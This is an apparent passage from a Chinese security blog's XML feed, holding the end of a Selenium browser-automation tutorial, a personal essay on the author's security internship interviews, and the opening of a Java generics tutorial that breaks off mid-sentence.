rel="noopener">http://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.common.action_chains</a></p><p><strong>ActionChains方法列表</strong><br>click(on_element=None) ——单击鼠标左键<br>click_and_hold(on_element=None) ——点击鼠标左键，不松开<br>context_click(on_element=None) ——点击鼠标右键<br>double_click(on_element=None) ——双击鼠标左键<br>drag_and_drop(source, target) ——拖拽到某个元素然后松开<br>drag_and_drop_by_offset(source, xoffset, yoffset) ——拖拽到某个坐标然后松开<br>key_down(value, element=None) ——按下某个键盘上的键<br>key_up(value, element=None) ——松开某个键<br>move_by_offset(xoffset, yoffset) ——鼠标从当前位置移动到某个坐标<br>move_to_element(to_element) ——鼠标移动到某个元素<br>move_to_element_with_offset(to_element, xoffset, yoffset)<br>——移动到距某个元素（左上角坐标）多少距离的位置<br>perform() ——执行链中的所有动作<br>release(on_element=None) ——在某个元素位置松开鼠标左键<br>send_keys(<em>keys_to_send) ——发送某个键到当前焦点的元素<br>send_keys_to_element(element, </em>keys_to_send) ——发送某个键到指定元素</p></blockquote><h4 id="5-执行JavaScript"><a href="#5-执行JavaScript" class="headerlink" title="(5)执行JavaScript"></a><strong>(5)执行JavaScript</strong></h4><p>当我们找不到现成的 api 的时候，我们可以使用 js 来帮助我们实现一些动作，比如进度条的拖拽等</p><p><strong>实例代码：</strong></p><pre><code>from selenium import webdriverbrowser = webdriver.Chrome()browser.get(&apos;https://www.zhihu.com/explore&apos;)browser.execute_script(&apos;window.scrollTo(0, document.body.scrollHeight)&apos;)browser.execute_script(&apos;alert(&quot;To Bottom&quot;)&apos;)browser.close()</code></pre><h3 id="5-获取元素信息"><a href="#5-获取元素信息" class="headerlink" title="5.获取元素信息"></a><strong>5.获取元素信息</strong></h3><h4 id="1-获取属性-1"><a href="#1-获取属性-1" class="headerlink" title="(1)获取属性"></a><strong>(1)获取属性</strong></h4><p><strong>实例代码：</strong></p><pre><code>from selenium import webdriverfrom selenium.webdriver import ActionChainsbrowser = webdriver.Chrome()url = &apos;https://www.zhihu.com/explore&apos;browser.get(url)logo = browser.find_element_by_id(&apos;zh-top-link-logo&apos;)print(logo)print(logo.get_attribute(&apos;class&apos;))browser.close()</code></pre><h4 id="2-获取文本值"><a href="#2-获取文本值" class="headerlink" title="(2)获取文本值"></a><strong>(2)获取文本值</strong></h4><p><strong>实例代码：</strong></p><pre><code>from selenium import webdriverbrowser = webdriver.Chrome()url = &apos;https://www.zhihu.com/explore&apos;browser.get(url)input = browser.find_element_by_class_name(&apos;zu-top-add-question&apos;)print(input.text)browser.close()</code></pre><h4 id="3-获取ID、位置、标签名、大小"><a href="#3-获取ID、位置、标签名、大小" class="headerlink" title="(3)获取ID、位置、标签名、大小"></a><strong>(3)获取ID、位置、标签名、大小</strong></h4><p><strong>实例代码：</strong></p><pre><code>from selenium import webdriverbrowser = webdriver.Chrome()url = &apos;https://www.zhihu.com/explore&apos;browser.get(url)input = browser.find_element_by_class_name(&apos;zu-top-add-question&apos;)print(input.id)print(input.location)print(input.tag_name)print(input.size)browser.close()</code></pre><h3 id="6-Frame-操作"><a href="#6-Frame-操作" class="headerlink" title="6.Frame 操作"></a><strong>6.Frame 操作</strong></h3><p>如果出现 frame 或者 iframe 我们必须要进入这个区域才能进行操作</p><p><strong>实例代码：</strong></p><pre><code>import timefrom selenium import webdriverfrom selenium.common.exceptions import NoSuchElementExceptionbrowser = webdriver.Chrome()url = &apos;http://www.runoob.com/try/try.php?filename=jqueryui-api-droppable&apos;browser.get(url)browser.switch_to.frame(&apos;iframeResult&apos;)source = browser.find_element_by_css_selector(&apos;#draggable&apos;)print(source)try:    logo = browser.find_element_by_class_name(&apos;logo&apos;)except NoSuchElementException:    print(&apos;NO LOGO&apos;)finally:    browser.close()browser.switch_to.parent_frame()logo = browser.find_element_by_class_name(&apos;logo&apos;)print(logo)print(logo.text)</code></pre><h3 id="7-等待"><a href="#7-等待" class="headerlink" title="7.等待"></a><strong>7.等待</strong></h3><h4 id="1-隐式等待"><a href="#1-隐式等待" class="headerlink" title="(1)隐式等待"></a><strong>(1)隐式等待</strong></h4><p>这个方法是针对网页中的 ajax 请求设计的，当 webdriver 查找元素或元素并没有立即出现的时候(可能还需要后期的 ajax 请求)，隐式等待将等待一段时间再查找 DOM，默认的时间是0</p><p><strong>实例代码：</strong></p><pre><code>from selenium import webdriverbrowser = webdriver.Chrome()browser.implicitly_wait(10)browser.get(&apos;https://www.zhihu.com/explore&apos;)input = browser.find_element_by_class_name(&apos;zu-top-add-question&apos;)print(input)browser.close()</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;selenium.webdriver.remote.webelement.WebElement (session=&quot;a607aed65e614d975de7a1273522ff3a&quot;, element=&quot;0.7555513559347986-1&quot;)&gt;</code></pre><h4 id="2-显式等待"><a href="#2-显式等待" class="headerlink" title="(2)显式等待"></a><strong>(2)显式等待</strong></h4><p>显示等待会设置一个条件和一个最长等待时间，如果在这个最长等待时间内条件还是没有成立才会抛出异常</p><p><strong>实例代码：</strong></p><pre><code>from selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECbrowser = webdriver.Chrome()browser.get(&apos;https://www.taobao.com/&apos;)wait = WebDriverWait(browser, 10)input = wait.until(EC.presence_of_element_located((By.ID, &apos;q&apos;)))button = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, &apos;.btn-search&apos;)))print(input, button)browser.close()</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;selenium.webdriver.remote.webelement.WebElement (session=&quot;c3730876d29127a08cdcdb54a664600f&quot;, element=&quot;0.37070383186598255-1&quot;)&gt; &lt;selenium.webdriver.remote.webelement.WebElement (session=&quot;c3730876d29127a08cdcdb54a664600f&quot;, element=&quot;0.37070383186598255-2&quot;)&gt;</code></pre><blockquote><p><strong>补充：</strong></p></blockquote><p><strong>常见的判断条件：</strong></p><blockquote><p>title_is 标题是某内容<br>title_contains 标题包含某内容<br>presence_of_element_located 元素加载出，传入定位元组，如(By.ID, ‘p’)<br>visibility_of_element_located 元素可见，传入定位元组<br>visibility_of 可见，传入元素对象<br>presence_of_all_elements_located 所有元素加载出<br>text_to_be_present_in_element 某个元素文本包含某文字<br>text_to_be_present_in_element_value 某个元素值包含某文字<br>frame_to_be_available_and_switch_to_it frame加载并切换<br>invisibility_of_element_located 元素不可见<br>element_to_be_clickable 元素可点击<br>staleness_of 判断一个元素是否仍在DOM，可判断页面是否已经刷新<br>element_to_be_selected 元素可选择，传元素对象<br>element_located_to_be_selected 元素可选择，传入定位元组<br>element_selection_state_to_be 传入元素对象以及状态，相等返回True，否则返回False<br>element_located_selection_state_to_be 传入定位元组以及状态，相等返回True，否则返回False<br>alert_is_present 是否出现Alert</p><p><strong>官方文档：</strong><br><a href="http://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.support.expected_conditions" target="_blank" rel="noopener">http://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.support.expected_conditions</a></p></blockquote><h3 id="8-前进后退"><a href="#8-前进后退" class="headerlink" title="8.前进后退"></a><strong>8.前进后退</strong></h3><p><strong>实例代码：</strong></p><pre><code>from selenium import webdriver browser = webdriver.Chrome()browser.get(&quot;http://www.baidu.com&quot;)browser.get(&quot;http://www.taobao.com&quot;)browser.get(&quot;http://www.zhihu.com&quot;)browser.back()browser.forward()browser.close()</code></pre><h3 id="9-Cookies"><a href="#9-Cookies" class="headerlink" title="9.Cookies"></a><strong>9.Cookies</strong></h3><p><strong>实例代码：</strong></p><pre><code>from selenium import webdriverbrowser = webdriver.Chrome()browser.get(&apos;http://www.baidu.com&apos;)print(browser.get_cookies())browser.add_cookie({&apos;name&apos;:&apos;Tom&apos;,&apos;pass&apos;:&apos;123456&apos;,&apos;value&apos;: &apos;germey&apos;})print(browser.get_cookies())browser.delete_all_cookies()print(browser.get_cookies())browser.close()</code></pre><h3 id="10-选项卡操作"><a href="#10-选项卡操作" class="headerlink" title="10.选项卡操作"></a><strong>10.选项卡操作</strong></h3><p><strong>实例代码：</strong></p><pre><code>from selenium import webdriverimport timebrowser = webdriver.Chrome()browser.get(&apos;http://www.baidu.com&apos;)browser.execute_script(&apos;window.open()&apos;)print(browser.window_handles)browser.switch_to.window(browser.window_handles[1])browser.get(&apos;http://www.taobao.com&apos;)time.sleep(1)browser.switch_to.window(browser.window_handles[0])browser.get(&apos;http://httpbin.org&apos;)browser.close()</code></pre><p><strong>运行结果：</strong></p><pre><code>[&apos;CDwindow-3FCC47842DFF6841B4C86EE72CB7DB93&apos;, &apos;CDwindow-CCFA4494DE4B6C99494BE87524153E4E&apos;]</code></pre><h3 id="11-异常处理"><a href="#11-异常处理" class="headerlink" title="11.异常处理"></a><strong>11.异常处理</strong></h3><p><strong>实例代码：</strong></p><pre><code>from selenium import webdriverfrom selenium.common.exceptions import TimeoutException, NoSuchElementExceptionbrowser = webdriver.Chrome()try:    browser.get(&apos;https://www.baidu.com&apos;)except TimeoutException:    print(&apos;Time Out&apos;)try:    browser.find_element_by_id(&apos;hello&apos;)except NoSuchElementException:    print(&apos;No Element&apos;)finally:    browser.close()</code></pre><p><strong>运行结果：</strong></p><pre><code>No Element</code></pre><blockquote><p><strong>补充：</strong></p><p>官方文档：详细文档：<a href="http://selenium-python.readthedocs.io/api.html#module-selenium.common.exceptions" target="_blank" rel="noopener">http://selenium-python.readthedocs.io/api.html#module-selenium.common.exceptions</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0X01-常用的-python-库&quot;&gt;&lt;a href=&quot;#0X01-常用的-python-库&quot; class=&quot;headerlink&quot; title=&quot;0X01 常用的 python 库&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X01 常用的 python 库&lt;/strong&gt;&lt;/h2&gt;&lt;h3 id=&quot;1-urllib&quot;&gt;&lt;a href=&quot;#1-urllib&quot; class=&quot;headerlink&quot; title=&quot;1.urllib&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.urllib&lt;/strong&gt;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;import urllib
import urllib.request
urllib.request.urlopen(&amp;quot;http://www.baidu.com&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;2-re&quot;&gt;&lt;a href=&quot;#2-re&quot; class=&quot;headerlink&quot; title=&quot;2.re&quot;&gt;&lt;/a&gt;&lt;strong&gt;2.re&lt;/strong&gt;&lt;/h3&gt;&lt;h3 id=&quot;3-requests&quot;&gt;&lt;a href=&quot;#3-requests&quot; class=&quot;headerlink&quot; title=&quot;3.requests&quot;&gt;&lt;/a&gt;&lt;strong&gt;3.requests&lt;/strong&gt;&lt;/h3&gt;&lt;h3 id=&quot;4-selenimu&quot;&gt;&lt;a href=&quot;#4-selenimu&quot; class=&quot;headerlink&quot; title=&quot;4.selenimu&quot;&gt;&lt;/a&gt;&lt;strong&gt;4.selenimu&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;这个库是配合一些驱动去爬取动态渲染网页的库&lt;/p&gt;
    
    </summary>
    
      <category term="备忘" scheme="https://www.k0rz3n.com/categories/%E5%A4%87%E5%BF%98/"/>
    
    
      <category term="爬虫" scheme="https://www.k0rz3n.com/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>New Page,New Future</title>
    <link href="https://www.k0rz3n.com/2019/04/29/New%20Page%20,New%20Future/"/>
    <id>https://www.k0rz3n.com/2019/04/29/New Page ,New Future/</id>
    <published>2019-04-29T11:32:18.000Z</published>
    <updated>2019-04-29T11:34:19.918Z</updated>
    
    <content type="html"><![CDATA[<h2 id="期盼"><a href="#期盼" class="headerlink" title="期盼"></a><strong>期盼</strong></h2><p>我搭建博客的初衷本来并不是单纯用来写技术文章的，但是还是因为时间和精力关系没时间去好好写一些其他类型的文章，最开始认真去写的一篇非技术文章应该就是我刚刚博客搭建起来的时候写的第一篇文章，我还起了一个看似特别文艺的名字：”笔随心动，落笔生花”，因为我其实也不是一个死板的理科生，我对优美的文字有着特殊的敏感，对细腻的情感有着强烈的共鸣，自己在感情浓烈的时候也写过一些诗和歌词，来当做生活的调味剂，所以我从大学一开始就希望自己不要成为一个死板的理科生，希望自己能在整个大学期间从文学中汲取一些养分，提升自己的文学素养，同时也可以开阔自己看问题的角度。</p><h2 id="初识"><a href="#初识" class="headerlink" title="初识"></a><strong>初识</strong></h2><p>可后来发现大学并不是我想的那样：每天能喝喝茶、看看闲书、晒晒太阳…想在想起来真的是一个笑话，果然大学不是来养老的</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/New%20Page1.png" alt="此处输入图片的描述"></p><p>上课，上课，上课，学技术，学技术，学技术…可能在那样一个环境下唯一想的就是这个吧，有时候可能太过专注，没有给曾经爱过我的人足够的陪伴，于是奋斗的路上就剩了我一个人，有时候我也想，自己有能力了才能给对方更好的生活，不努力有什么办法？谁让我年少无为呢？？</p><p>我也就是在那段最艰难的时候，我看了一些书，想获得一些灵感，后来我只能说我没办法，我不后悔。</p><p>认识了很多志同道合的伙伴，渐渐也看清了自己的目标，自己的未来。</p><h2 id="相知"><a href="#相知" class="headerlink" title="相知"></a><strong>相知</strong></h2><p>其实之前我也不怎么写博客，但是总觉得好好的东西放着荒废真的不好，搞技术还是多交流才能有进步，秉承着这个原则，我开始认真的写博客，仅仅是为了记录一下自己的学习经过，尽可能详细一点，因为有时候突然忘了怎么弄自己看看自己博客快速回忆一下还是挺方便的，如果有新的发现和别人分享就更好了。</p><p>后来也把博客的文章投了一些在 freebuf 什么的上面，感觉还是有挺多人喜欢的，那时候超有成就感的，哈哈，我发现投稿和打比赛一样，也能认识更多的志同道合的人。</p><p>因为其实大二开始就没打算上研究生了，所以后期可能花费在学技术上的时间相对就躲了一些，但是为了不补考，我还是没选择让自己挂科(事实上，复习复习成绩还是不错的)。</p><p>但是还是不能阻止我的菜。。</p><p>后来实习也在绿盟做过安服，什么 CTF出题培训、渗透、开发、应急响应啥都干，真可以说是非常丰富的工作经验了，不过是很棒的财富，感谢公司能收留我这个菜鸡。</p><p>再后来就大三了，真的是很快…仿佛自己还什么都没做…自己也承担了更多的责任，给L出题什么的，为了出一个有趣新颖的题在自习室待了一个月，各种测试挖掘，不过也总算是发掘到了一些有趣的点。但是事实上最后因为一些失误没能让这道题发挥它该有的作用，有些遗憾，不过这种高强度的挖掘还是让我有了不小的提升，也算是收获吧。</p><h2 id="抉择"><a href="#抉择" class="headerlink" title="抉择"></a><strong>抉择</strong></h2><p>如今…找实习，看别人写写自己的面试经历，我也凑凑热闹</p><h3 id="科恩"><a href="#科恩" class="headerlink" title="科恩"></a><strong>科恩</strong></h3><h4 id="经历"><a href="#经历" class="headerlink" title="经历"></a><strong>经历</strong></h4><p>听过科恩招 web 了,当时还是寒假，我在家没事就是投呗，试试看呗，投了以后没过几天就预约面试了(打电话过来预约后天的面试)，面试那天正好是中秋节，hhh，问了很多，和我想象的面试时一样的，自我介绍以后，从变量覆盖开始问起，问到 X-XSS-Protection 这个头，问到 CSP 的原理和绕过方法，如何区分不同的数据库，然后问我域渗透 NTML rely，问完了基础漏洞和渗透，就画风一转开始问扫描器了，你用过什么扫描器？扫描器是怎么去重的？如果遇到web 2.0 的页面了扫描器怎么扫描？等等等等，似乎也是一些比较基础的问题，但是没有稍微去提前去了解一下还是有点蒙蔽，后来我问问题的时候就问了他们需要什么样的人，科恩那边说，需要开发扫描器产品。。。。然后还有一些 iot 相关的渗透工作，瞬间觉得自己确实不合适，后来等了一个礼拜确实挂了，不过那段时间我也学了很多关于扫描器的知识，看了很多的东西，很有收获。</p><h4 id="启示"><a href="#启示" class="headerlink" title="启示"></a><strong>启示</strong></h4><p>面试之前最好能知道对方需要什么样子的人，需要什么技能，最好先去打听一下，自己提前准备一下，不要不管三七二十一就上去面，一面就死</p><h3 id="数字"><a href="#数字" class="headerlink" title="数字"></a><strong>数字</strong></h3><p>有时候我觉得我还是挺固执的，其实投了那么久就投了一下腾讯、蚂蚁，因为真的有点想去甲方，没有投360的原因是因为 360 重复的岗位太多了，我真的不知道该投哪里，本来想去投一些搞APT之类的地方，但是后来简历到了 CERT ,然后我让 CERT 转到追日之类的，但是似乎后来也没了消息，估计根本不需要 web 方向的，然后我也犹豫要不要投A-TEAM,毕竟是做域渗透的，我比较感兴趣，后来我又发现了几个实验室，比如观星、云影什么的(不过后来应该属于奇安信了)，但是我后来了解了一下并不是我理解的那种甲方专门搞研究的实验室，还是几乎是乙方，后来犹豫犹豫就干脆没投</p><h3 id="蚂蚁"><a href="#蚂蚁" class="headerlink" title="蚂蚁"></a><strong>蚂蚁</strong></h3><h4 id="经历-1"><a href="#经历-1" class="headerlink" title="经历"></a><strong>经历</strong></h4><p>再说说蚂蚁，蚂蚁是让我的一个学长内推的，是一个搞 APT 的部门，面试官有点冷，问的也是非常的全面，后渗透那一套，什么信息收集、进程隐藏、提权、权限维持啥的都问了，还有就是问我一些扫描器的开发、问我获得的奖、问我一些常见的 web 漏洞的利用方式，感觉他们经常是给一个模拟场景去让你分析</p><p>比如问到了内网有一个 XSS 点你可以怎么利用？因为 XSS 在内网嘛，你即使拿到 cookie 也没法登录，似乎考察的就是 XSS 除了打 cookie 以外的利用方法，我其实还是从对信息的获取方面来思考的，我记得我当时答了一些钓鱼，泄露后台地址，键盘记录什么的。然后是从文件的传递方面考虑，比如从远端下载文件，然后可以上传在同一个域内的任意文件，我记得有些 XSS 平台就有类似的脚本，CTF 可能还用到过，还有就是从传播的角度考虑，就是内网的蠕虫什么的。</p><p>还问了 XXE 无回显怎么办，就是一个外带而已(当然面试的时候要具体说，你直接说外带应该会给面试官留下不好的印象)</p><p>我记得还有一个问我 powershell 进程被检测，但是还想用怎么办…没经历过这种，后来我查了一下， Powershell 是基于 C# 和 .Net 的，我们可以用 C# 自己写一个同样功能的东西，而不是调用 powershell.exe 真的是学到了。</p><p>还问了如何去区分 不同的数据库，我也都答了具体的函数，变量，语句等，感觉这个没什么大问题</p><p>最后其实因为我简历上写了读过 sqlmap 的部分源码，面试官让我自己讲一下里面某个关键模块的关键技术和运行方式</p><p>总之，蚂蚁的面试在我看来问的非常全面并且细腻，感觉有点不像是在找实习生，要求非常之高，其中可能有几个比较关键的问题我因为经验不足，还有加上短路和准备不充分回答的不是很好，最后没能通过</p><h4 id="启示-1"><a href="#启示-1" class="headerlink" title="启示"></a><strong>启示</strong></h4><p>回答问题的时候一定要回答具体，比如因为什么原理，所以用什么方法，具体这个方法怎么弄，这个都要答出来，不要说的太泛了，让人听着觉得你的解决办法没有针对性，这样反而起不到好的效果。</p><h3 id="腾讯"><a href="#腾讯" class="headerlink" title="腾讯"></a><strong>腾讯</strong></h3><h4 id="经历-2"><a href="#经历-2" class="headerlink" title="经历"></a><strong>经历</strong></h4><p>再说说腾讯，这次走的是网申流程(科恩之前是直接投邮箱的)，因为我的简历各种被不想去的部门锁住，然后一面一个礼拜，再加上转投要时间，就进度超级缓慢，整个3月份几乎就在转简历然后，等待，实际上我真正想去的就是面试了一个云鼎的一个专家服务组(感觉也有点像乙方)，面试也不难，就是让我自我介绍一下，根据简历问了问一些渗透经验，问完了渗透实战，就是开始问基础 web 漏洞，不过这个面试官挺有趣，因为我简历写了熟悉常见 web 漏洞的原理及利用方法，他就让我自己说(我还确认了一下他是不是不问问题，让我全部自己说，他说是的)，然后我就从基本的一个个说下去，说道 XSS 的时候，面试官开始加戏，问我 XSS 的利用方式(也就是能用 XSS 做什么)，似乎和之前蚂蚁的思路差不多，然后我又说了半天，后来面试官不让我说了，说我知道你对这些了解比较深入了，后来就随便聊了聊，感觉还不错其实，但是后来还是挂了，就很迷。</p><p>再后来就是阴差阳错拿到了一个腾讯做 APT 部门的邮箱，我就直接投了，因为当时我的简历正锁在安全管家那边，然后当时实际上提前批快要结束了，简历要重新打乱，管家那边后来电话都没来就直接挂了我(我猜是因为来不及面试了)，面试还是比较平稳，主要问的就是我的一些渗透溯源的经历，然后从我的经历开始变形，不断增加难度，然后看我有没有什么思路，比如端口受限之类的，然后就是问后渗透的各种，然后重点在渗透的思路之类的，要有整体的把握，然后问了比如给你一个网站，就拿腾讯主站为例说说你的思路(思路题面试官是很看重的，很能展现一个人的思维是不是灵活)，后来在如何入侵一个系统的时候面试官还帮我开阔思路，比如从无线的角度入侵等等(不愧是APT…)</p><p>后来二面就是聊 APT 相关的手法，我之前其实有过一些研究和学习，总的来说还是比较顺畅，奥，还问我有没有女朋友。。。尴尬</p><h4 id="启示-2"><a href="#启示-2" class="headerlink" title="启示"></a><strong>启示</strong></h4><p>要有充分的准备，流利的口才，满腔的热情，一定的缘分，灵活的思维，不要拘泥于眼前的漏洞，更重要的是渗透的思路。</p><h2 id="未来"><a href="#未来" class="headerlink" title="未来"></a><strong>未来</strong></h2><p>未来是什么？我也不知道，首先是努力不被开除吧….拼了</p><p>未完待续….</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;期盼&quot;&gt;&lt;a href=&quot;#期盼&quot; class=&quot;headerlink&quot; title=&quot;期盼&quot;&gt;&lt;/a&gt;&lt;strong&gt;期盼&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;我搭建博客的初衷本来并不是单纯用来写技术文章的，但是还是因为时间和精力关系没时间去好好写一些其他类型的文章
      
    
    </summary>
    
      <category term="随笔" scheme="https://www.k0rz3n.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随笔" scheme="https://www.k0rz3n.com/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>JAVA 泛型、动态代理技术要点梳理</title>
    <link href="https://www.k0rz3n.com/2019/04/20/JAVA%20%E6%B3%9B%E5%9E%8B%E3%80%81%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF%E8%A6%81%E7%82%B9%E6%A2%B3%E7%90%86/"/>
    <id>https://www.k0rz3n.com/2019/04/20/JAVA 泛型、动态代理技术要点梳理/</id>
    <published>2019-04-20T11:28:18.000Z</published>
    <updated>2019-04-29T02:38:53.684Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>最近想写一点关于 Java 的东西，然后又遇见了 Java 中比较核心的几个技术，这几个技术贯穿整个 Java 的学习，也是后面各种框架的技术基础，因此深入理解这几种技术对我们后期分析各种框架是非常有帮助的，如果学的不精、不透，那么后面你分析各种漏洞的时候都会被绕进去，这也就是我对这些技术进行简单整理的原因。</p><h2 id="0X01-泛型"><a href="#0X01-泛型" class="headerlink" title="0X01 泛型"></a><strong>0X01 泛型</strong></h2><h3 id="1-什么是泛型"><a href="#1-什么是泛型" class="headerlink" title="1.什么是泛型"></a><strong>1.什么是泛型</strong></h3><p>泛型，即“参数化类型”，将类型定义成参数形式(形参)，使用的使用传入具体的类型(实参)，也就是说在泛型使用过程中，操作的数据类型被指定为一个参数，这种参数类型可以用在类、接口和方法中，分别被称为泛型类、泛型接口、泛型方法。</p><h3 id="2-泛型解决什么样的问题"><a href="#2-泛型解决什么样的问题" class="headerlink" title="2.泛型解决什么样的问题"></a><strong>2.泛型解决什么样的问题</strong></h3><pre><code>List arrayList = new ArrayList();arrayList.add(&quot;aaaa&quot;);arrayList.add(100);for(int i = 0; i&lt; arrayList.size();i++){    String item = (String)arrayList.get(i);    Log.d(&quot;泛型测试&quot;,&quot;item = &quot; + item);}</code></pre><p>这段代码是可以编译成功的，因为 arrayList 本身就可以存放任意类型的数据，但是运行时会报错，因为你使用的时候强制将 Integer 当做 String 类型使用，所以这样的特性并不利于我们代码的纠错与维护，我们希望在编译的时候就能给我们提示，于是泛型就应运而生</p><h3 id="3-泛型的生命周期"><a href="#3-泛型的生命周期" class="headerlink" title="3.泛型的生命周期"></a><strong>3.泛型的生命周期</strong></h3><p>为了更好地使用泛型，我们首先要知道泛型的生命周期只在编译阶段有效，也就是说泛型是提供给Javac编译器看的，可以限定集合中的输入类型，让编译器挡住源程序中的非法输入，在正确检验泛型结果后，会将泛型的相关信息抹去。</p><p><strong>代码实例：</strong></p><pre><code>ArrayList&lt;String&gt; collection2 = new ArrayList&lt;String&gt;();ArrayList&lt;Integer&gt; collection3 = new ArrayList&lt;Integer&gt;();//对于参数化的泛型类型，getClass()方法的返回值和原始类型完全一样System.out.println(collection3.getClass());//结果为：java.util.ArrayListSystem.out.println(collection3.getClass() == collection2.getClass());//结果为true</code></pre><p>也就是说我们能绕过编译器的眼睛，来往 arrayList 里面添加其他类型数据</p><p><strong>代码实例：</strong></p><pre><code>//使用反射得到集合，然后调用add方法往原本只能存储Integer对象的集合中存储一个String类型的对象collection3.getClass().getMethod(&quot;add&quot;, Object.class).invoke(collection3, &quot;abc&quot;);System.out.println(collection3.get(0));//输出的结果为：abc，这证明字符串对象确实是存储到了原本只能存储Integer对象的集合中</code></pre><h3 id="4-泛型的使用"><a href="#4-泛型的使用" class="headerlink" title="4.泛型的使用"></a><strong>4.泛型的使用</strong></h3><h4 id="1-泛型类"><a href="#1-泛型类" class="headerlink" title="(1)泛型类"></a><strong>(1)泛型类</strong></h4><p>泛型类型用于类的定义中，被称为泛型类。通过泛型可以完成对一组类的操作对外开放相同的接口。最典型的就是各种容器类，如：List、Set、Map。</p><p><strong>基本格式：</strong></p><pre><code>class 类名称 &lt;泛型标识：可以随便写任意标识号，标识指定的泛型的类型&gt;{  private 泛型标识 /*（成员变量类型）*/ var;   .....  }}</code></pre><p><strong>代码实例：</strong></p><p><strong>Generic.java</strong></p><pre><code>//此处T可以随便写为任意标识，常见的如T、E、K、V等形式的参数常用于表示泛型//在实例化泛型类时，必须指定T的具体类型public class Generic&lt;T&gt;{    //key这个成员变量的类型为T,T的类型由外部指定    private T key;    public Generic(T key) { //泛型构造方法形参key的类型也为T，T的类型由外部指定        this.key = key;    }    public T getKey(){ //泛型方法getKey的返回值类型为T，T的类型由外部指定        return key;    }}</code></pre><p><strong>Main.java</strong></p><pre><code>import java.lang.*;public class Main {    public static void main(String[] args) {        //泛型的类型参数只能是类类型（包括自定义类），不能是简单类型        //传入的实参类型需与泛型的类型参数类型相同，即为Integer.        Generic&lt;Integer&gt; genericInteger = new Generic&lt;Integer&gt;(123456);        //传入的实参类型需与泛型的类型参数类型相同，即为String.        Generic&lt;String&gt; genericString = new Generic&lt;String&gt;(&quot;key_vlaue&quot;);        //不传入任何的泛型类型参数        Generic generic = new Generic(&quot;111111&quot;);        Generic generic1 = new Generic(4444);        Generic generic2 = new Generic(55.55);        Generic generic3 = new Generic(false);        System.out.println(&quot;泛型测试 key is &quot; + genericInteger.getKey());        System.out.println(&quot;泛型测试 key is &quot; + genericString.getKey());        System.out.println(&quot;泛型测试 key is &quot; + generic.getKey());        System.out.println(&quot;泛型测试 key is &quot; + generic1.getKey());        System.out.println(&quot;泛型测试 key is &quot; + generic2.getKey());        System.out.println(&quot;泛型测试 key is &quot; + generic3.getKey());    }}</code></pre><p><strong>输出结果：</strong></p><pre><code>泛型测试 key is 123456泛型测试 key is key_vlaue泛型测试 key is 111111泛型测试 key is 4444泛型测试 key is 55.55泛型测试 key is false</code></pre><p>从上面的例子我们可以看到，定义的泛型类，并不一定要传入泛型类型实参，在使用泛型的时候如果传入泛型实参，则会根据传入的泛型实参做相应的限制，此时泛型才会起到本应起到的限制作用。如果不传入泛型类型实参的话，在泛型类中使用泛型的方法或成员变量定义的类型可以为任何的类型。但是实际上这样是不推荐的，因为编辑器会有一个警告，如下图所示</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JAVA%20%E6%B3%9B%E5%9E%8B%E3%80%81%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF%E8%A6%81%E7%82%B9%E6%A2%B3%E7%90%861.png" alt="此处输入图片的描述"></p><p><strong>一些补充：</strong></p><p><strong>(1)参数化类型与原始类型的兼容性：</strong></p><ul><li><p>参数化类型可以引用一个原始类型的对象，编译时编译器会报警告，例如：<code>Collection&lt;String&gt;</code> c = new Vector();</p></li><li><p>原始类型可以引用一个参数化类型的对象，编译时编译器会报警告，例如：Collection c = new <code>Vector&lt;String&gt;()</code>;</p></li><li><p>参数化类型不考虑类型参数的继承关系：<br><code>Vector&lt;String&gt;</code> v = new <code>Vector&lt;Object&gt;()</code>;//错误，语法上不通过<br><code>Vector&lt;Object&gt;</code> v = new <code>Vector&lt;String&gt;()</code>;//错误，语法上不通过</p></li><li><p>假设 <code>Vector&lt;String&gt;</code> v = new <code>Vector&lt;Object&gt;</code>;可以的话，那么以后从v中取出的对象当作String用，而v实际指向的集合中可以加入任意类型的对象，</p></li><li><p>假设 <code>Vector&lt;Object&gt;</code> v = new <code>Vector&lt;String&gt;</code>;可以的话，那么以后可以向v中加入任意类型的对象，而v实际指向的集合中只能装String类型的对象</p></li></ul><p><strong>(2)思考：下面的代码会报错吗？（不会报错）</strong></p><p>Vector v1 = new <code>Vector&lt;String&gt;()</code>;//参数化类型的对象可以给原始类型的引用<br><code>Vector&lt;Object&gt;</code> v=v1;//参数化类型的引用可以指向原始类型的对象</p><h4 id="2-泛型接口"><a href="#2-泛型接口" class="headerlink" title="(2)泛型接口"></a><strong>(2)泛型接口</strong></h4><p>泛型接口与泛型类的定义及使用基本相同。泛型接口常被用在各种类的生产器中，可以看一个例子：</p><pre><code>//定义一个泛型接口public interface Generator&lt;T&gt; {    public T next();}</code></pre><p>当实现泛型接口的类，未传入泛型实参时，与泛型类的定义相同，在声明类的时候，需将泛型的声明也一起加到类中</p><p>即：class <code>FruitGenerator&lt;T&gt;</code> implements Generator<t>{…}如果不声明泛型，如：class FruitGenerator implements 